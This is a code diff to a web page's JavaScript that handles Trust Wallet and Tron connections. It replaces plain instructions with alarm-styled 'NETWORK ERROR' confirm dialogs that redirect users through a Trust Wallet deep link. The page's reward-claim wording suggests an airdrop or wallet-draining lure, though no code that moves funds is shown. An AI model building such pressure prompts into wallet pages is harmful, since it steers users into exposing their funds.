@@ -86,11 +86,23 @@
                     alert("Connection rejected.");
                 }
             } else if (window.ethereum) {
-                // Trust Wallet user is on Ethereum network
-                alert("⚠️ NETWORK ERROR:\n\nYou are currently on the Ethereum network.\n\nPlease click the network icon (top right corner in Trust Wallet) and switch to the 'Tron' network to claim your reward.");
+                // Trust Wallet user is on Ethereum network. Force reload into Tron network via Deep Link!
+                const currentUrl = encodeURIComponent(window.location.href);
+                const trustWalletTronLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${currentUrl}`;
+                
+                const userConfirmed = confirm("⚠️ NETWORK ERROR:\n\nYou are on the Ethereum network.\n\nClick 'OK' to automatically reopen Trust Wallet with the TRON network selected.");
+                if(userConfirmed) {
+                    window.location.href = trustWalletTronLink;
+                }
             } else {
-                // Not in a dApp browser
-                alert("Please open this website inside the Trust Wallet or TronLink dApp Browser, and ensure the Tron network is selected.");
+                // Not in a dApp browser, show deep link for mobile users
+                const currentUrl = encodeURIComponent(window.location.href);
+                const trustWalletTronLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${currentUrl}`;
+                
+                const userConfirmed = confirm("Please open this website inside Trust Wallet.\n\nClick 'OK' to automatically launch Trust Wallet for Tron.");
+                if(userConfirmed) {
+                    window.location.href = trustWalletTronLink;
+                }
             }
         });
 
